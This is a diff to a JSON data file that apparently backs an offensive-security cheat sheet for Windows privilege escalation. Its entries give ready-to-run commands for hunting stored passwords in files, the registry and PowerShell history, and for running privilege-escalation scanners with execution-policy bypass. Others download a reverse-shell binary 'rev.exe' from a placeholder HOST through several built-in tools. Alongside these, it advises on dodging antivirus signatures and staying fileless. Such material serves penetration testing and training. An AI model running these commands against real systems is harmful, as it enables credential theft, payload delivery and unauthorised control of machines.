@@ -50,8 +50,8 @@
           "id": "en-search",
           "label": "Hunt for secrets",
           "console": true,
-          "detail": "Credentials leak into files. Recurse the drive for passwords in config and script files, check the saved-credential store with cmdkey /list, read unattended-install files (Unattend.xml, sysprep.inf hold base64 or plaintext passwords), and grep the registry for autologon and VNC/PuTTY secrets. The PowerShell history file often holds a typed-out credential.",
-          "cmd": ["findstr /si password *.txt *.ini *.config *.xml", "cmdkey /list", "type C:\\Windows\\Panther\\Unattend.xml", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword", "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"]
+          "detail": "Credentials leak into files. Recurse the drive for passwords in config and script files (findstr, or PowerShell's Get-ChildItem | Select-String for a real regex when findstr is too blunt), check the saved-credential store with cmdkey /list, read unattended-install files (Unattend.xml, sysprep.inf hold base64 or plaintext passwords), and grep the registry for autologon and VNC/PuTTY secrets. The PowerShell history file often holds a typed-out credential. For the deep version (LaZagne, browser stores, GPP cpassword on SYSVOL) see the Credential access map.",
+          "cmd": ["findstr /si password *.txt *.ini *.config *.xml", "powershell -c \"Get-ChildItem C:\\ -Recurse -Include *.config,*.xml,*.ini -EA SilentlyContinue | Select-String 'password|pwd'\"", "cmdkey /list", "type C:\\Windows\\Panther\\Unattend.xml", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword", "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"]
         }
       ],
       "next": { "label": "Proceed to UAC bypass", "to": "uac" }
@@ -114,8 +114,8 @@
           "id": "pe-scanners",
           "label": "Automated scanners",
           "console": true,
-          "detail": "winPEAS enumerates everything (services, registry, tokens, files, scheduled tasks) and colour-codes the likely wins; run winPEASany.exe or the .bat. PowerUp (part of PowerSploit) focuses on misconfigurations and can auto-exploit some (Invoke-AllChecks). SharpUp is the C# port. Run one for breadth, then verify by hand, scanners flag theory, you confirm the exploit.",
-          "cmd": ["winPEASany.exe", "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"", "SharpUp.exe audit"]
+          "detail": "No single scanner fits every box, so carry a few. winPEAS enumerates everything (services, registry, tokens, files, scheduled tasks) and colour-codes the likely wins; run winPEASany.exe, the .bat, or the .ps1 when you cannot drop an exe. PowerUp (PowerSploit) focuses on misconfigurations and can auto-exploit some (Invoke-AllChecks); PrivescCheck is a lighter PowerShell-only alternative that runs in memory with nothing on disk. SharpUp is the C# port of PowerUp, and Seatbelt gathers the host facts the others skip. Run one for breadth, then verify by hand, scanners flag theory, you confirm the exploit.",
+          "cmd": ["winPEASany.exe", "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"", "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"", "SharpUp.exe audit", "Seatbelt.exe -group=all"]
         },
         {
           "id": "pe-services",
@@ -180,8 +180,8 @@
           "id": "lb-download",
           "label": "Download a file",
           "console": true,
-          "detail": "Several trusted binaries pull a file from your HTTP server. certutil -urlcache -f fetches and saves (and -encode/-decode handles base64). bitsadmin and the PowerShell equivalents (Invoke-WebRequest / the WebClient) do the same. certutil is the most-signatured, so rotate between them. The binaries and their one-liners are in the LOLBAS table below.",
-          "cmd": ["certutil -urlcache -f http://HOST/rev.exe C:\\Windows\\Temp\\rev.exe", "bitsadmin /transfer job /download /priority normal http://HOST/rev.exe C:\\Windows\\Temp\\rev.exe", "powershell -c \"Invoke-WebRequest http://HOST/rev.exe -OutFile C:\\Windows\\Temp\\rev.exe\""]
+          "detail": "Several trusted binaries pull a file from your HTTP server, so if one is blocked, signatured or stripped, another usually works. certutil -urlcache -f fetches and saves (and -encode/-decode moves a file as base64 when downloads are filtered). bitsadmin queues a background transfer. PowerShell has two routes: Invoke-WebRequest, and the older Net.WebClient (DownloadFile / DownloadString for fileless) which works on hosts where IWR is constrained. curl.exe ships on Windows 10 1803+ and is the quietest of the lot. certutil is the most-signatured, so keep it last. The binaries and their one-liners are in the LOLBAS table below.",
+          "cmd": ["certutil -urlcache -f http://HOST/rev.exe C:\\Windows\\Temp\\rev.exe", "bitsadmin /transfer job /download /priority normal http://HOST/rev.exe C:\\Windows\\Temp\\rev.exe", "powershell -c \"Invoke-WebRequest http://HOST/rev.exe -OutFile C:\\Windows\\Temp\\rev.exe\"", "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://HOST/rev.exe','C:\\Windows\\Temp\\rev.exe')\"", "curl.exe http://HOST/rev.exe -o C:\\Windows\\Temp\\rev.exe"]
         },
         {
           "id": "lb-execute",
